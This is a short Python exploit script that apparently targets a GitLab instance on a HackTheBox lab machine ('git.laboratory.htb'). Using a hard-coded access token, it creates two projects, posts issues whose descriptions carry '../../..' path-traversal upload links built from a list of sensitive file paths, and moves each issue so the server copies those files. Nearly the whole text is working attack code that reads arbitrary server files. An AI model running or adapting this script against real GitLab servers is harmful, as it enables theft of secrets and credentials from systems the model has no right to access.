import os
import requests
import json
from time import sleep
from gitlab import *

session=requests.Session()
session.verify=f'{os.getcwd()}/laboratory-htb.pem'  # or set session.verify = False

host='https://git.laboratory.htb'


def exploit(projectName, issueTitle, files, token):
	gl=Gitlab(host, private_token=token, session=session)
	gl.auth()
	p1=gl.projects.create({'name': f"{projectName}-1"})
	p2=gl.projects.create({'name': f"{projectName}-2"})

	for i, f in enumerate(files):
		stripped_f=f.rstrip('\n')
		issue=p1.issues.create({ \
			'title': f"{issueTitle}-{i}",
			'description': \
				"![a](/uploads/11111111111111111111111111111111/" \
				f"../../../../../../../../../../../../../..{stripped_f})"})
		print(issue.description)
		sleep(3)
		try:
			issue.move(p2.id)
		except Exception as e:
			pass
		sleep(3)


if __name__=="__main__":
	token='dASx_yxjLhMs94iFw28f'
	files=list(open('senstive_files', 'r'))
	exploit('project-4', 'issue-5', files,token)
